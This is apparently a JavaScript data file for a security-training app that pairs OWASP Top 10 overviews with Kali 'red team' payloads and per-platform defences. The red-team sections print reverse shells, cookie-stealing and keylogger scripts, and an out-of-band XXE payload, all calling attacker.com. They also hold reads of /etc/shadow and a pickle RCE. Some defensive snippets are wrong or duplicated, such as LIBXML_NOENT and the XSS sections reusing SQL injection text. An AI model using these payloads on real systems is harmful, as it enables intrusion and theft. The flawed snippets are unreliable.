// Example "proactive controls" data (some may be unused if you only show them in InfoPanel)
const proactiveControlsData = {
  C7_ACCESS_CONTROLS: `
    <h3>C7: Enforce Access Controls</h3>
    <p>
      Access Control (Authorization) is the process of granting or denying specific requests 
      from a user, program, or process. Failure to implement proper access control 
      can lead to unauthorized disclosure, modification, or destruction.
    </p>
    <ul>
      <li>Enforce checks consistently</li>
      <li>Use deny by default</li>
      <li>Implement RBAC</li>
    </ul>
  `,

  vulnerabilityGuides: {
    sqlInjection: {
      title: "A03:2021 - SQL Injection",
      content: `
        <h3>SQL Injection Overview</h3>
        <p>
          SQL injection occurs when untrusted user input is concatenated into SQL queries.
          This can lead to unauthorized data access, modification, or deletion of data.
        </p>
      `,
      redTeam: `
        <h4>Kali Linux Testing Guide</h4>
        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
# Test a specific URL parameter
sqlmap -u "http://target.com/page.php?id=1" --dbs

# Test POST data
sqlmap -u "http://target.com/form" --data="user=admin&pass=test" --dbs
        </code></pre>
      `,
      blueTeamWindows: `
        <h4>Blue Team Protection (Windows/.NET)</h4>
        
        <h5>1. Use Entity Framework Core</h5>
        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
# Safe query using LINQ
var user = await context.Users
    .Where(u => u.Id == userId)
    .FirstOrDefaultAsync();

# Parameterized ADO.NET
using (var cmd = new SqlCommand(
    "SELECT * FROM Users WHERE Id = @UserId", conn)) 
{
    cmd.Parameters.AddWithValue("@UserId", userId);
    // ...
}
        </code></pre>

        <h5>2. IIS Web.config Settings</h5>
        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
<configuration>
   <system.web>
      <httpRuntime enableVersionHeader="false" 
                   requestValidationMode="2.0" />
      <pages validateRequest="true" />
   </system.web>
</configuration>
        </code></pre>

        <h5>3. Windows Defender ATP Rules</h5>
        <p>Enable SQL Server audit logging and alerts for:</p>
        <ul>
          <li>Failed login attempts</li>
          <li>Schema changes</li>
          <li>Privilege escalation attempts</li>
        </ul>
      `,
      blueTeamMac: `
        <h4>Blue Team Protection (Mac/PHP)</h4>
        
        <h5>1. PDO Prepared Statements</h5>
        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
<?php
$stmt = $pdo->prepare('SELECT * FROM users WHERE id = :id');
$stmt->execute(['id' => $userId]);
$user = $stmt->fetch();
        </code></pre>

        <h5>2. Apache ModSecurity Rules</h5>
        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
# In httpd.conf or .htaccess
SecRule REQUEST_URI|REQUEST_BODY "@detectSQLi" \
    "id:981231,phase:2,block,msg:'SQL Injection Attack'"
        </code></pre>

        <h5>3. PHP Configuration</h5>
        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
# php.ini settings
magic_quotes_gpc = Off
sql.safe_mode = On
        </code></pre>
      `,
      blueTeamLinux: `
        <h4>Blue Team Protection (Linux/Node.js)</h4>
        
        <h5>1. Use ORM/Query Builders</h5>
        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
# Sequelize ORM
const user = await User.findOne({
  where: { id: userId }
});

# Knex Query Builder
const users = await knex('users')
  .where({ id: userId })
  .select();
        </code></pre>

        <h5>2. ModSecurity on Nginx</h5>
        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
# nginx.conf
location / {
    modsecurity on;
    modsecurity_rules_file /etc/nginx/modsec/main.conf;
}
        </code></pre>

        <h5>3. AppArmor Profile</h5>
        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
# /etc/apparmor.d/usr.sbin.mysqld
/usr/sbin/mysqld {
    /var/lib/mysql/ r,
    /var/lib/mysql/** rwk,
    /var/log/mysql/ r,
    /var/log/mysql/* rw,
}
        </code></pre>
      `
    },

    xssVulnerability: {
      title: "A03:2021 - Cross-Site Scripting (XSS)",
      content: `
        <h3>XSS Attack Overview</h3>
        <p>
          Cross-site scripting occurs when malicious scripts are injected into trusted websites.
          These can steal session tokens, cookies, and other sensitive information.
        </p>
      `,
      redTeam: `
        <h4>Kali Linux Testing Guide</h4>
        
        <h5>1. Basic XSS Payloads</h5>
        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
# Basic tests
<code>
scriptXMLTag alert(1) script
</code>
<code>
imgXMLTag src=x onerror=alert(1)>
</code>
<code>
svgXMLTag onload=alert(1)>
</code>
</code>

# Cookie stealing
scriptXMLTag
fetch('http://attacker.com/steal?cookie='+document.cookie)
</scriptXMLTag>

# Keylogger
<code>
scriptXMLTag
document.onkeypress = function(e) {
  fetch('http://attacker.com/log?key='+e.key)
}
</code>
        </code></pre>

        <h5>2. Using XSS Tools</h5>
        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
# Using XSSer
xsser --url "http://target.com/search?q=FUZZ" --auto

# Using BurpSuite
1. Enable proxy
2. Send to Intruder
3. Load XSS payload list
4. Start attack
        </code></pre>
      `,
      blueTeamWindows: `
        <h4>Blue Team Protection (Windows/.NET)</h4>
        
        <h5>1. Use built-in XSS protection</h5>
        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
# In Startup.cs
app.Use(async (context, next) => {
    context.Response.Headers.Add("X-XSS-Protection", "1; mode=block");
    await next();
});
        </code></pre>

        <h5>2. Implement CSP headers</h5>
        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-random123'
        </code></pre>
      `,
      blueTeamMac: `
        <h4>Blue Team Protection (Mac/PHP)</h4>
        
        <h5>1. PDO Prepared Statements</h5>
        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
<?php
$stmt = $pdo->prepare('SELECT * FROM users WHERE id = :id');
$stmt->execute(['id' => $userId]);
$user = $stmt->fetch();
        </code></pre>

        <h5>2. Apache ModSecurity Rules</h5>
        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
# In httpd.conf or .htaccess
SecRule REQUEST_URI|REQUEST_BODY "@detectSQLi" \
    "id:981231,phase:2,block,msg:'SQL Injection Attack'"
        </code></pre>

        <h5>3. PHP Configuration</h5>
        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
# php.ini settings
magic_quotes_gpc = Off
sql.safe_mode = On
        </code></pre>
      `,
      blueTeamLinux: `
        <h4>Blue Team Protection (Linux/Nginx/Node.js)</h4>
        
        <h5>1. Use ORM/Query Builders</h5>
        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
# Sequelize ORM
const user = await User.findOne({
  where: { id: userId }
});

# Knex Query Builder
const users = await knex('users')
  .where({ id: userId })
  .select();
        </code></pre>

        <h5>2. ModSecurity on Nginx</h5>
        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
# nginx.conf
location / {
    modsecurity on;
    modsecurity_rules_file /etc/nginx/modsec/main.conf;
}
        </code></pre>

        <h5>3. AppArmor Profile</h5>
        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
# /etc/apparmor.d/usr.sbin.mysqld
/usr/sbin/mysqld {
    /var/lib/mysql/ r,
    /var/lib/mysql/** rwk,
    /var/log/mysql/ r,
    /var/log/mysql/* rw,
}
        </code></pre>
      `
    },

    // Example for broken access control
    brokenAccessControl: {
      title: "A01:2021 - Broken Access Control",
      content: `
        <h3>Server-side Access Control Overview</h3>
        <p>
          Broken Access Control is often found when roles or permissions are 
          only enforced on the client side, or misconfigured on the server.
        </p>
        <ul>
          <li>Always check permissions server-side</li>
          <li>Deny by default, allow only if explicitly granted</li>
          <li>Avoid direct object references without checks</li>
        </ul>
      `,
      redTeam: `
        <h4 class="text-red-400">Kali Pentest Approach</h4>
        <p>Use tools like <strong>Burp Suite</strong> or <strong>OWASP ZAP</strong> to intercept requests and manipulate roles or IDs:</p>
        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
# Example: Modify JSON or query string to escalate privileges
{
  "role": "admin"
}
        </code></pre>
        <p>Check if the server enforces admin privileges or not.</p>
      `,
      blueTeamWindows: `
        <h4>Blue Team (Windows/IIS/.NET)</h4>
        <p>
          In ASP.NET, decorate controllers or actions with <code>[Authorize(Roles="Admin")]</code> 
          to enforce role checks server-side.
        </p>
        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
[Authorize(Roles = "Admin")]
public IActionResult AdminOnly() {
   // ...
}
        </code></pre>
      `,
      blueTeamMac: `
        <h4>Blue Team (Mac/Apache/PHP)</h4>
        <p>
          Use <strong>.htaccess</strong> or <strong>Apache configurations</strong> to enforce 
          directory-level security. Deny by default:
        </p>
        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
<Directory /var/www/html/secure>
   Require all denied
</Directory>
        </code></pre>
        <p>And enforce checks in your PHP code as well.</p>
      `,
      blueTeamLinux: `
        <h4>Blue Team (Linux/Nginx/Node.js)</h4>
        <p>
          Implement middleware for each route to enforce server-side checks:
        </p>
        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
function requireAdmin(req, res, next) {
  if (!req.user || !req.user.isAdmin) {
    return res.status(403).send('Forbidden');
  }
  next();
}

app.get('/api/v1/docs/:id', requireAdmin, (req, res) => {
   // ...
});
        </code></pre>
      `
    },

    commandExecution: {
      title: "A03:2021 - Command Injection",
      content: `
        <h3>Command Injection Overview</h3>
        <p>
          Command injection vulnerabilities occur when applications pass unsafe user input to system shells.
          This can lead to unauthorized command execution on the host system.
        </p>
      `,
      redTeam: `
        <h4>Kali Linux Testing Guide</h4>
        
        <h5>1. Basic Command Injection</h5>
        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
# Basic payload tests
; ls -la
& whoami
| cat /etc/passwd
\`id\`
$(cat /etc/shadow)

# Command chaining
original_cmd && malicious_cmd
original_cmd | malicious_cmd
        </code></pre>

        <h5>2. Advanced Techniques</h5>
        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
# Bypass space filters
cat\${IFS}/etc/passwd
{cat,/etc/passwd}
X=\$'cat\\x20/etc/passwd'&&\$X

# Reverse shells
bash -i >& /dev/tcp/attacker.com/4444 0>&1
nc -e /bin/sh attacker.com 4444
python -c 'import socket,subprocess;s=socket.socket();s.connect(("attacker.com",4444));subprocess.call(["/bin/sh","-i"])'
        </code></pre>

        <h5>3. Using Command Injection Tools</h5>
        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
# Using commix
commix --url="http://target.com/vulnerable.php?cmd=id" --level=3

# Using BurpSuite Intruder
1. Intercept request
2. Send to Intruder
3. Load command injection payload list
4. Start attack
        </code></pre>
      `,
      blueTeamWindows: `
        <h4>Blue Team Protection (Windows)</h4>
        
        <h5>1. Use Safe APIs</h5>
        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
# Instead of Process.Start with shell
Process.Start("cmd.exe", "/c " + userInput);  // Unsafe

# Use safe alternatives
Process.Start(new ProcessStartInfo {
    FileName = "program.exe",
    Arguments = sanitizedInput,
    UseShellExecute = false,
    RedirectStandardOutput = true
});
        </code></pre>

        <h5>2. AppLocker Rules</h5>
        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
# PowerShell command to create AppLocker rule
New-AppLockerPolicy -RuleType Path -PathCondition "C:\\Windows\\*" -User Everyone -Action Allow
        </code></pre>

        <h5>3. Windows Defender Application Control</h5>
        <p>Enable and configure WDAC policies to restrict executable files.</p>
      `,
      blueTeamMac: `
        <h4>Blue Team Protection (Mac)</h4>
        
        <h5>1. Use NSTask Instead of system()</h5>
        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/bin/ls"];
[task setArguments:@[@"-l"]];
[task launch];
        </code></pre>

        <h5>2. System Integrity Protection</h5>
        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
# Check SIP status
csrutil status

# Enable SIP (requires recovery mode)
csrutil enable
        </code></pre>

        <h5>3. XProtect and Gatekeeper</h5>
        <p>Keep XProtect and Gatekeeper enabled and updated.</p>
      `,
      blueTeamLinux: `
        <h4>Blue Team Protection (Linux)</h4>
        
        <h5>1. Use Safe Execution Methods</h5>
        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
# Instead of exec or system
const { execFile } = require('child_process');
execFile('ls', ['-l'], (error, stdout, stderr) => {
    if (error) {
        console.error('Error:', error);
        return;
    }
    console.log(stdout);
});
        </code></pre>

        <h5>2. SELinux/AppArmor Profiles</h5>
        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
# AppArmor profile
profile web-app /usr/bin/web-app {
    /usr/bin/web-app r,
    /var/www/** r,
    deny /etc/shadow r,
    deny /etc/passwd r,
}
        </code></pre>

        <h5>3. System Hardening</h5>
        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
# Restrict shell access
chsh -s /usr/sbin/nologin username

# Remove unnecessary SUID binaries
find / -perm -4000 -type f
chmod u-s /path/to/unnecessary/suid/binary
        </code></pre>
      `
    },

    sensitiveExposure: {
      title: "A02:2021 - Cryptographic Failures",
      content: `
        <h3>Sensitive Data Exposure Overview</h3>
        <p>
          Cryptographic failures lead to exposure of sensitive data such as passwords,
          credit card numbers, and personal information.
        </p>
      `,
      redTeam: `
        <h4>Kali Linux Testing Guide</h4>
        
        <h5>1. Network Traffic Analysis</h5>
        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
# Using Wireshark
wireshark -i eth0 -f "host target.com"

# Using tcpdump
tcpdump -i eth0 -A 'host target.com and tcp port 80'

# SSLstrip for HTTPS downgrade
sslstrip -l 8080
arpspoof -i eth0 -t target_ip gateway_ip
        </code></pre>

        <h5>2. Static Analysis</h5>
        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
# Search for API keys and secrets
grep -r "api[_-]key" .
grep -r "secret[_-]key" .
find . -type f -exec grep -l "password" {} \;

# Using trufflehog
trufflehog --regex --entropy=True https://github.com/target/repo
        </code></pre>
      `,
      blueTeamWindows: `
        <h4>Blue Team Protection (Windows)</h4>
        
        <h5>1. Windows Data Protection API</h5>
        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
# Using DPAPI
byte[] entropy = new byte[16];
new RNGCryptoServiceProvider().GetBytes(entropy);

byte[] encryptedData = ProtectedData.Protect(
    plaintext,
    entropy,
    DataProtectionScope.CurrentUser
);
        </code></pre>

        <h5>2. Azure Key Vault Integration</h5>
        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
var client = new SecretClient(
    new Uri("https://your-vault.vault.azure.net/"),
    new DefaultAzureCredential()
);

KeyVaultSecret secret = await client.GetSecretAsync("secret-name");
        </code></pre>
      `
    },

    xxeVulnerability: {
      title: "A05:2021 - XML External Entity (XXE)",
      content: `
        <h3>XXE Attack Overview</h3>
        <p>
          XML External Entity attacks occur when XML parsers process external entity references.
          This can lead to data disclosure, denial of service, or server-side request forgery.
        </p>
      `,
      redTeam: `
        <h4>Kali Linux Testing Guide</h4>
        
        <h5>1. Basic XXE Payloads</h5>
        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
# File disclosure
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>

# SSRF via XXE
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://internal-server/secret" >]>
<foo>&xxe;</foo>

# DoS via billion laughs
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;" >
<!ENTITY a2 "&a1;&a1;&a1;&a1;" >
]>
        </code></pre>

        <h5>2. Advanced XXE Testing</h5>
        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
# Using XXEinjector
ruby XXEinjector.rb --host=192.168.0.2 --path=/etc/passwd --file=/tmp/req.txt

# Out-of-band XXE
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
%xxe;]>
        </code></pre>
      `,
      blueTeamWindows: `
        <h4>Blue Team Protection (Windows/.NET)</h4>
        
        <h5>1. Safe XML Parsing</h5>
        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
# Disable DTD processing
XmlReaderSettings settings = new XmlReaderSettings {
    DtdProcessing = DtdProcessing.Prohibit,
    XmlResolver = null
};

using (XmlReader reader = XmlReader.Create(stream, settings)) {
    # Parse XML safely
}
        </code></pre>

        <h5>2. Web.config Security</h5>
        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
<configuration>
  <system.xml.serialization>
    <xmlSerializer checkDeserialize="true" />
  </system.xml.serialization>
</configuration>
        </code></pre>
      `,
      blueTeamMac: `
        <h4>Blue Team Protection (Mac/PHP)</h4>
        
        <h5>1. libxml Security</h5>
        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
# Disable external entities
libxml_disable_entity_loader(true);

# Safe XML parsing
$xml = simplexml_load_string($xmlstr, 'SimpleXMLElement', 
    LIBXML_NOENT | LIBXML_NOCDATA);
        </code></pre>

        <h5>2. PHP Configuration</h5>
        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
# php.ini settings
libxml.disable_entity_loader = On
        </code></pre>
      `,
      blueTeamLinux: `
        <h4>Blue Team Protection (Linux/Node.js)</h4>
        
        <h5>1. XML Parser Configuration</h5>
        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
# Using xml2js safely
const parser = new xml2js.Parser({
  explicitEntities: false,
  resolveEntities: false
});

parser.parseString(xml, (err, result) => {
  # Handle parsed XML
});
        </code></pre>

        <h5>2. ModSecurity Rules</h5>
        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
# Detect XXE attempts
SecRule REQUEST_BODY "@contains <!ENTITY" \
  "id:1000,phase:2,deny,status:403,msg:'XXE Attack Detected'"
        </code></pre>
      `
    },

    securityMisconfig: {
      title: "A05:2021 - Security Misconfiguration",
      content: `
        <h3>Security Misconfiguration Overview</h3>
        <p>
          Security misconfiguration happens when security settings are defined, implemented, 
          or maintained using insecure values. This is one of the most common vulnerabilities.
        </p>
      `,
      redTeam: `
        <h4>Kali Linux Testing Guide</h4>
        
        <h5>1. Configuration Discovery</h5>
        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
# Directory enumeration
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# Default credentials
hydra -L users.txt -P passes.txt target.com http-post-form

# Port scanning
nmap -sV -sC target.com
        </code></pre>

        <h5>2. Common Misconfigurations</h5>
        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
# Check for debug endpoints
curl http://target.com/debug/vars
curl http://target.com/phpinfo.php

# Test CORS misconfiguration
curl -H "Origin: http://evil.com" -I http://target.com/api

# Check security headers
curl -I http://target.com
        </code></pre>
      `,
      blueTeamWindows: `
        <h4>Blue Team Protection (Windows/IIS)</h4>
        
        <h5>1. IIS Hardening</h5>
        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
<!-- web.config security -->
<configuration>
  <system.web>
    <compilation debug="false"/>
    <trace enabled="false"/>
    <customErrors mode="On"/>
  </system.web>
  <system.webServer>
    <security>
      <requestFiltering removeServerHeader="true"/>
    </security>
  </system.webServer>
</configuration>
        </code></pre>

        <h5>2. Security Headers</h5>
        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
<httpProtocol>
  <customHeaders>
    <add name="X-Frame-Options" value="DENY"/>
    <add name="X-Content-Type-Options" value="nosniff"/>
    <remove name="X-Powered-By"/>
  </customHeaders>
</httpProtocol>
        </code></pre>
      `,
      blueTeamMac: `
        <h4>Blue Team Protection (Mac/Apache)</h4>
        
        <h5>1. Apache Security Configuration</h5>
        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
# Security headers in .htaccess
Header set X-Frame-Options "DENY"
Header set X-Content-Type-Options "nosniff"
Header set Content-Security-Policy "default-src 'self'"
Header unset X-Powered-By

# Disable directory listing
Options -Indexes

# Restrict access to sensitive files
<FilesMatch "^\.">
    Order allow,deny
    Deny from all
</FilesMatch>
        </code></pre>

        <h5>2. PHP Hardening</h5>
        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
# php.ini security settings
display_errors = Off
expose_php = Off
session.cookie_httponly = 1
session.cookie_secure = 1
allow_url_fopen = Off
        </code></pre>
      `,
      blueTeamLinux: `
        <h4>Blue Team Protection (Linux/Nginx)</h4>
        
        <h5>1. Nginx Hardening</h5>
        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
# nginx.conf security settings
server {
    # Hide version number
    server_tokens off;
    
    # Security headers
    add_header X-Frame-Options "DENY";
    add_header X-Content-Type-Options "nosniff";
    add_header Content-Security-Policy "default-src 'self'";
    
    # SSL configuration
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_prefer_server_ciphers on;
    ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256;ECDHE-RSA-AES128-GCM-SHA256;
}
        </code></pre>

        <h5>2. System Hardening</h5>
        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
# Update package lists
apt update && apt upgrade

# Configure firewall
ufw default deny incoming
ufw default allow outgoing
ufw allow ssh
ufw allow http
ufw allow https
ufw enable

# Secure shared memory
echo "tmpfs     /run/shm     tmpfs     defaults,noexec,nosuid     0     0" >> /etc/fstab
        </code></pre>
      `
    },

    insecureDeserialization: {
      title: "A08:2021 - Software and Data Integrity Failures",
      content: `
        <h3>Insecure Deserialization Overview</h3>
        <p>
          Insecure deserialization occurs when applications deserialize untrusted input,
          potentially leading to remote code execution or privilege escalation.
        </p>
      `,
      redTeam: `
        <h4>Kali Linux Testing Guide</h4>
        
        <h5>1. Basic Deserialization Testing</h5>
        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
# Python pickle exploitation
import pickle
import os

class Evil(object):
    def __reduce__(self):
        return (os.system, ('whoami',))

print(pickle.dumps(Evil()))

# PHP serialization attack
O:4:"User":2:{s:4:"name":s:6:"hacker":s:5:"admin":b:1;}
        </code></pre>

        <h5>2. Advanced Techniques</h5>
        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
# Using ysoserial
java -jar ysoserial.jar CommonsCollections1 'wget http://attacker.com/shell.php' > payload.bin

# Node.js deserialization
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('whoami')}()"}
        </code></pre>
      `,
      blueTeamWindows: `
        <h4>Blue Team Protection (Windows/.NET)</h4>
        
        <h5>1. Safe Deserialization</h5>
        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
# Use JSON instead of BinaryFormatter
var options = new JsonSerializerOptions
{
    TypeInfoResolver = JsonSerializer.IsReflectionEnabledByDefault
};

var obj = JsonSerializer.Deserialize<SafeType>(json, options);
        </code></pre>

        <h5>2. Input Validation</h5>
        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
# Validate before deserializing
if (!IsValidInput(input))
{
    throw new SecurityException("Invalid input");
}

[JsonSerializable(typeof(SafeType))]
public partial class JsonContext : JsonSerializerContext
{
}
        </code></pre>
      `,
      blueTeamMac: `
        <h4>Blue Team Protection (Mac/PHP)</h4>
        
        <h5>1. Safe Deserialization in PHP</h5>
        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
# Use JSON instead of unserialize
$data = json_decode($input, true);

# If unserialize is needed, use allowed_classes
$data = unserialize($input, ['allowed_classes' => ['SafeClass']]);
        </code></pre>

        <h5>2. Input Validation</h5>
        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
# Validate structure before processing
function validateInput($input) {
    $schema = [
        'type' => 'object',
        'properties' => [
            'name' => ['type' => 'string'],
            'id' => ['type' => 'integer']
        ]
    ];
    return Validator::validate($input, $schema);
}
        </code></pre>
      `,
      blueTeamLinux: `
        <h4>Blue Team Protection (Linux/Node.js)</h4>
        
        <h5>1. Safe Deserialization Practices</h5>
        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
# Use JSON.parse instead of eval
const safeData = JSON.parse(input);

# If using node-serialize, implement whitelist
const serialize = require('node-serialize');
const whitelist = ['SafeClass'];

function safeDeserialize(input) {
    const parsed = serialize.unserialize(input);
    if (!whitelist.includes(parsed.constructor.name)) {
        throw new Error('Unsafe deserialization attempted');
    }
    return parsed;
}
        </code></pre>

        <h5>2. Security Headers and Configurations</h5>
        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
# Express security middleware
const helmet = require('helmet');
app.use(helmet());

# Custom deserialization middleware
app.use((req, res, next) => {
    if (req.body && typeof req.body === 'string') {
        try {
            req.body = JSON.parse(req.body);
        } catch (e) {
            return res.status(400).send('Invalid JSON');
        }
    }
    next();
});
        </code></pre>
      `
    },

    knownVulnComponents: {
      title: "A06:2021 - Vulnerable and Outdated Components",
      content: `
        <h3>Vulnerable Components Overview</h3>
        <p>
          Using components with known vulnerabilities can lead to various attacks.
          Regular updates and security audits are essential.
        </p>
      `,
      redTeam: `
        <h4>Kali Linux Testing Guide</h4>
        
        <h5>1. Dependency Analysis</h5>
        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
# Using OWASP Dependency-Check
dependency-check --scan /path/to/application

# Using Retire.js
retire --path /path/to/webapp

# Using npm audit
npm audit
yarn audit

# Using Snyk
snyk test
        </code></pre>

        <h5>2. Version Fingerprinting</h5>
        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
# Wappalyzer CLI
wappalyzer https://target.com

# Builtwith
curl -A "Mozilla/5.0" https://api.builtwith.com/v14/api.json?KEY=XXX&LOOKUP=target.com

# Manual header inspection
curl -I https://target.com
        </code></pre>
      `,
      blueTeamWindows: `
        <h4>Blue Team Protection (Windows/.NET)</h4>
        
        <h5>1. NuGet Security</h5>
        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
# Install security scanning tools
dotnet tool install --global security-scan

# Add package security scanning
<PropertyGroup>
  <RunSecurityScan>true</RunSecurityScan>
</PropertyGroup>

# Use central package management
<PackageVersion Include="Newtonsoft.Json" Version="13.0.1" />
        </code></pre>

        <h5>2. Automated Updates</h5>
        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
# Enable Dependabot in .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "nuget"
    directory: "/"
    schedule:
      interval: "daily"
        </code></pre>
      `
    }
  }
};

export default proactiveControlsData;
export const vulnerabilityGuides = proactiveControlsData.vulnerabilityGuides;
